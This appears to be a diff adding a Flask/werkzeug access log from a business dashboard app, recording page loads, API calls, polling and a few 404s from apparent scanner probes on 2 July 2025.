+2025-07-02 13:54:58,740 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 13:54:58] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 14:13:01,901 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:13:01] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 14:31:01,665 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:31:01] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 14:31:33,878 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:31:33] "[33mGET /aaa9 HTTP/1.0[0m" 404 -
+2025-07-02 14:31:37,939 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:31:37] "[33mGET /aab8 HTTP/1.0[0m" 404 -
+2025-07-02 14:31:40,734 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:31:40] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 14:48:23,655 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:48:23] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 14:49:21,310 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "GET / HTTP/1.0" 200 -
+2025-07-02 14:49:21,541 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:49:21,542 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:49:21,552 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:49:21,578 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "[36mGET /static/js/dashboard.js HTTP/1.0[0m" 304 -
+2025-07-02 14:49:21,712 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:49:21,715 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:49:21,743 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:21] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 14:49:51,697 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:51] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:49:51,699 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:51] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:49:55,268 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:55] "GET /registries/contracts HTTP/1.0" 200 -
+2025-07-02 14:49:55,307 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:55] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:49:55,310 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:55] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:49:55,310 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:49:55] "[33mGET /registries/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:50:04,803 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:04] "GET /contacts HTTP/1.0" 200 -
+2025-07-02 14:50:04,827 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:04] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:50:04,830 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:04] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:50:04,831 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:04] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:50:04,938 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:04] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-02 14:50:04,952 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:04] "[32mGET /api/counterparties HTTP/1.0[0m" 308 -
+2025-07-02 14:50:05,015 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:05] "GET /api/counterparties/ HTTP/1.0" 200 -
+2025-07-02 14:50:05,015 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:05] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-02 14:50:20,837 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:20] "PUT /api/contacts/15 HTTP/1.0" 200 -
+2025-07-02 14:50:20,858 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:20] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-02 14:50:20,867 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:50:20] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-02 14:51:04,023 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:51:04] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 14:51:42,868 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:51:42] "GET /settings/company HTTP/1.0" 200 -
+2025-07-02 14:51:43,011 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:51:43] "[33mGET /settings/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:51:43,014 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:51:43] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:51:43,020 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:51:43] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:52:52,935 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:52] "GET /select-company HTTP/1.0" 200 -
+2025-07-02 14:52:55,860 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:55] "[32mPOST /select-company HTTP/1.0[0m" 302 -
+2025-07-02 14:52:55,868 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:55] "GET / HTTP/1.0" 200 -
+2025-07-02 14:52:55,922 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:55] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:52:55,927 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:55] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:52:55,968 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:55] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:52:55,995 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:55] "[36mGET /static/js/dashboard.js HTTP/1.0[0m" 304 -
+2025-07-02 14:52:56,190 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:56] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:52:56,192 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:56] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:52:59,463 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:59] "GET /settings/company HTTP/1.0" 200 -
+2025-07-02 14:52:59,504 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:59] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:52:59,505 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:59] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:52:59,519 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:52:59] "[33mGET /settings/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:53:29,313 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "GET / HTTP/1.0" 200 -
+2025-07-02 14:53:29,355 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:53:29,357 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:53:29,358 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:53:29,378 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "[36mGET /static/js/dashboard.js HTTP/1.0[0m" 304 -
+2025-07-02 14:53:29,526 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:53:29,536 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:53:29] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:54:00,035 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:54:00] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:54:00,037 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:54:00] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:54:30,034 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:54:30] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:54:30,036 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:54:30] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:55:00,032 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:55:00] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:55:00,034 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:55:00] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:55:30,032 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:55:30] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:55:30,033 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:55:30] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:56:00,031 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:00] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:56:00,032 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:00] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:56:30,032 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:30] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 14:56:30,035 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:30] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 14:56:45,264 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "GET /contacts HTTP/1.0" 200 -
+2025-07-02 14:56:45,306 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:56:45,308 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:56:45,310 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:56:45,436 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-02 14:56:45,437 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "[32mGET /api/counterparties HTTP/1.0[0m" 308 -
+2025-07-02 14:56:45,493 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "GET /api/counterparties/ HTTP/1.0" 200 -
+2025-07-02 14:56:45,609 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:56:45] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-02 14:57:34,863 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:57:34] "GET /export HTTP/1.0" 200 -
+2025-07-02 14:58:06,501 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:06] "GET /settings/localization HTTP/1.0" 200 -
+2025-07-02 14:58:06,534 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:06] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:58:06,536 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:06] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:58:06,538 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:06] "[33mGET /settings/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:58:50,376 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:50] "GET /settings/theme HTTP/1.0" 200 -
+2025-07-02 14:58:50,399 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:50] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 14:58:50,401 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:50] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 14:58:50,403 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:58:50] "[33mGET /settings/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 14:59:13,431 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 14:59:13] "[33mGET /cgi/conf.bin HTTP/1.0[0m" 404 -
+2025-07-02 15:00:15,081 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:15] "GET /users HTTP/1.0" 200 -
+2025-07-02 15:00:15,110 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:15] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 15:00:15,112 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:15] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 15:00:15,114 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:15] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 15:00:15,150 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:15] "GET /static/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0" 200 -
+2025-07-02 15:00:53,955 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:53] "[33mGET /users/dsergeod@gmail.com/profile HTTP/1.0[0m" 404 -
+2025-07-02 15:00:59,376 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:00:59] "[33mGET /users/dsergeod@gmail.com/edit HTTP/1.0[0m" 404 -
+2025-07-02 15:01:08,807 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:08] "GET /account HTTP/1.0" 200 -
+2025-07-02 15:01:08,837 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:08] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 15:01:08,838 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:08] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 15:01:08,840 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:08] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 15:01:08,849 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:08] "[36mGET /static/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 304 -
+2025-07-02 15:01:58,170 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:58] "POST /account HTTP/1.0" 200 -
+2025-07-02 15:01:58,198 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:58] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 15:01:58,199 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:58] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 15:01:58,201 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:58] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 15:01:58,203 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:01:58] "[36mGET /static/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 304 -
+2025-07-02 15:02:05,259 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:02:05] "POST /account HTTP/1.0" 200 -
+2025-07-02 15:02:05,292 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:02:05] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 15:02:05,294 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:02:05] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 15:02:05,297 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:02:05] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 15:02:05,298 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:02:05] "[36mGET /static/uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 304 -
+2025-07-02 15:12:27,026 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:12:27] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 15:14:13,526 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:14:13] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 15:16:31,121 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:16:31] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 15:41:26,089 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:41:26] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 15:41:26,229 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:41:26] "GET /login HTTP/1.0" 200 -
+2025-07-02 15:42:29,405 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:42:29] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 15:53:54,532 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 15:53:54] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 16:04:23,589 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:04:23] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 16:05:56,586 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:05:56] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 16:05:56,867 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:05:56] "GET /login HTTP/1.0" 200 -
+2025-07-02 16:05:57,443 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:05:57] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 16:05:57,734 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:05:57] "GET /login HTTP/1.0" 200 -
+2025-07-02 16:12:41,819 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:12:41] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 16:24:23,054 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:24:23] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 16:31:34,668 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 16:31:34] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 17:10:53,054 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:10:53] "[32mGET / HTTP/1.0[0m" 302 -
+2025-07-02 17:11:19,973 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:11:19] "[33mGET /login.asp HTTP/1.0[0m" 404 -
+2025-07-02 17:20:53,799 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:53] "GET / HTTP/1.0" 200 -
+2025-07-02 17:20:54,024 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 17:20:54,029 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 17:20:54,031 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 17:20:54,255 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "[36mGET /static/js/dashboard.js HTTP/1.0[0m" 304 -
+2025-07-02 17:20:54,304 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 17:20:54,306 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 17:20:54,783 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:20:54] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+2025-07-02 17:21:24,311 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:21:24] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 17:21:24,313 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:21:24] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 17:21:46,340 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:21:46] "POST /update_status/10/done HTTP/1.0" 200 -
+2025-07-02 17:21:54,307 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:21:54] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 17:21:54,309 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:21:54] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 17:22:24,313 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:22:24] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 17:22:24,314 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:22:24] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 17:22:54,308 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:22:54] "[33mGET /data HTTP/1.0[0m" 404 -
+2025-07-02 17:22:54,310 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:22:54] "GET /requests_data HTTP/1.0" 200 -
+2025-07-02 17:23:14,785 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "GET /contacts HTTP/1.0" 200 -
+2025-07-02 17:23:14,815 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 17:23:14,815 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 17:23:14,817 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 17:23:14,874 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "[32mGET /api/contacts HTTP/1.0[0m" 308 -
+2025-07-02 17:23:14,876 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "[32mGET /api/counterparties HTTP/1.0[0m" 308 -
+2025-07-02 17:23:14,907 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "GET /api/contacts/ HTTP/1.0" 200 -
+2025-07-02 17:23:14,908 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:23:14] "GET /api/counterparties/ HTTP/1.0" 200 -
+2025-07-02 17:25:45,629 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:25:45] "GET /analytics HTTP/1.0" 200 -
+2025-07-02 17:25:45,659 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:25:45] "[36mGET /static/css/custom.css HTTP/1.0[0m" 304 -
+2025-07-02 17:25:45,661 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:25:45] "[33mGET /static/css/themes.css HTTP/1.0[0m" 404 -
+2025-07-02 17:25:45,662 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:25:45] "[33mGET /uploads/avatar_dsergeod_gmail_com.jpg HTTP/1.0[0m" 404 -
+2025-07-02 17:25:45,829 - werkzeug - INFO - 127.0.0.1 - - [02/Jul/2025 17:25:45] "GET /analytics/data HTTP/1.0" 200 -
